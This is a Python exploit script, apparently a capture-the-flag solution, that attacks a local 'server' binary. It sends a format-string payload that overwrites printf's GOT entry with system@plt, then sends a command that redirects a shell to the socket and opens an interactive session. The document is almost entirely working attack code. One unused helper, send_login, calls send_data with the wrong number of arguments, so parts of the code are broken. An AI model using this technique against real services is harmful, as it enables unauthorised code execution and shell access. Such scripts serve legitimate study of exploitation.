from ptrlib import *

def send_data(data, i):
    payload = p32(len(data))
    payload += p32(i)
    payload += data
    sock.send(payload)

def send_login(username, password):
    payload = bytes([len(username)])
    payload += bytes([len(password)])
    payload += username
    payload += password
    return send_data(len(payload), payload, 0)

elf = ELF("./server")
sock = Socket("127.0.0.1", 6210)

addr = elf.got("printf")
write = 0x401a10 # system@plt

payload = b"AAA"
n = 3
p = 15 + 12
for i in range(8):
    x = (write >> (8 * i)) & 0xFF
    l = (x - n - 1) % 0x100 + 1
    payload += str2bytes("%{}c%{}$hhn".format(l, p + i))
    n += l
assert len(payload) % 8 == 0
for i in range(8):
    payload += p64(addr + i)
print(payload)

send_data(payload, 10)
send_data(b"exec <&5 >&5 2>&5; /bin/sh\x00", 10)

sock.interactive()
